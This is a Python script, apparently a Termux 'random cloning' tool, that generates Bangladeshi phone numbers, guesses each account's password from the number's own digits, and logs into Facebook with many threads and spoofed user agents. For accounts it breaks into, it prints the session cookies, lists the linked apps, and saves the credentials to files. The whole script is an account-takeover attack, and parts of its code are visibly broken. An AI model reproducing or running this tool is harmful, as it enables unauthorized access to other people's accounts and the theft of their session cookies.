from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Kashif.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []

def clear():
    os.system('clear')
logo =("""
  \033[1;91m .d8888. d8b   db d888888b  d888b  d8888b. db   db  .d88b.  
\033[1;92m 88'  YP 888o  88   `88'   88' Y8b 88  `8D 88   88 .8P  Y8. 
\033[1;93m `8bo.   88V8o 88    88    88      88   88 88ooo88 88    88 
\033[1;91m  `Y8b.  88 V8o88    88    88  ooo 88   88 88~~~88 88    88 
\033[1;92m db   8D 88  V888   .88.   88. ~8~ 88  .8D 88   88 `8b  d8' 
\033[1;92m`8888Y'  VP   V8P Y888888P  Y888P  Y8888D' YP   YP  `Y88P'  
 
 
\x1b[1;94m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  SADMAN SAMIR SNIGDHO
\x1b[1;92m[+] ON FACEBOK   :  Snigdho Afridi
\x1b[1;93m[+] ON GITHUB    :  SNIGDHO-CYBER404
\x1b[1;94m[+] TOOL STATUS  :  Free
\x1b[1;95m[+] TOOL VIRSION :  2.0.0
\x1b[1;96m[+]==============================================[+]""" )

 
#####     #### 




def linex():
    print(f'==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
    else:
        print(f'\r  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[]---------------------------------------------------[]")
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_SNIGDHO_POWER_TOOLS.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"[01] {GREEN}START RANDOM CLONING")
    print(f"[00] {RED}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    Kashif = input("[>>>] CHOOSE : ")
    if Kashif in ["1","01"]:
        Random()
    elif Kashif in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Random():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"")
    print(' +88017 ,+88018 ,+88019 ,+88013')
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:    
        clear()
        tl = str(len(user))
        print(logo)
        print(f" {WHITE}TOTAL IDZ             : {RED}"+tl)
        print(f" {BLUE}NUMBER YOU PUT        : {RED}"+code)
        print(f" {GREEN}PROCESS HAS BEEN STARTED")
        print(f" {RED}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            header_wwwfb = {"authority": 'www.facebook.com'},
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            www_freefb = {"authority": 'www.facebook.com',
    "method": 'POST',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=9nrGYzt8JHKaiP3KrzFHxfu5; sb=9nrGYy8Hmqcs9b8KY0euhE5W; dpr=3; m_pixel_ratio=3; fr=0ZKPaXfCzrV4yBZgV..Bjxnr2.xO.AAA.0.0.Bj1lVc.AWXW5I0H6Ro; wd=980x1524',
    "referer": 'https://m.facebook.com/',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5360.101 Safari/537.36'}
            lo = session.post('https://www.facebook.com/login/device-based/login/async/',data=log_data,headers=header_wwwfb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[★]---------------------[ITZ SNIGDHO POWER OK]--------------------[★]\nEMAIL : '+uid+'\nUID   : '+uid+''+ps+ '\nCOOKIE   : '+coki+'\n[★]---------------------------------------------------[★]')
                cek_apk(session,coki)
                open('/sdcard/Snigdho-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('\r\033[1;91m[★]---------------------[ITZ SNIGDHO POWER CP]--------------------[★]\nEMAIL : '+uid+'\nUID   : '+uid+' '+ps+ '\n[★]---------------------------------------------------[★]\033[1;91m')
                open('/sdcard/Snigdho-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[2F-LOCK] '+uid+' | '+ps+'\033[1;97m')
                open('/sdcard/Snigdho-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(uid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SNIGDHO-KING] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()
